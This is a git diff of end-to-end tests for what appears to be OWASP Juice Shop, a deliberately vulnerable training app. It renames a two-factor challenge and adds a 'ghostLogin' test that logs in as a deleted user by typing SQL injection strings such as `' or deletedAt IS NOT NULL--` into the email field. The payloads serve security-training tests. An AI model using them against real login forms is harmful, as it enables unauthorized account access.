@@ -98,7 +98,7 @@ describe('/#/login', () => {
     protractor.expect.challengeSolved({ challenge: 'DLP Failure Tier 2' })
   })
 
-  describe('challenge "twoFactorAuth"', () => {
+  describe('challenge "twoFactorAuthUnsafeSecretStorage"', () => {
     const EC = protractor.ExpectedConditions
     let twoFactorTokenInput
     let twoFactorSubmitButton
@@ -150,5 +150,21 @@ describe('/#/login', () => {
     })
 
     protractor.expect.challengeSolved({ challenge: 'Login CISO' })
+  })
+
+  describe('challenge "ghostLogin"', () => {
+    it('should be able to log in as chris.pike@juice-sh.op by using `\' or deletedAt IS NOT NULL --`', () => {
+      email.sendKeys('\' or deletedAt IS NOT NULL--')
+      password.sendKeys('a')
+      loginButton.click()
+    })
+
+    it('should be able to log in as chris.pike@juice-sh.op by using `chris.pike@juice-sh.op\' --`', () => {
+      email.sendKeys('chris.pike@' + config.get('application.domain') + '\'--')
+      password.sendKeys('a')
+      loginButton.click()
+    })
+
+    protractor.expect.challengeSolved({ challenge: 'GDPR Compliance Tier 1' })
   })
 })
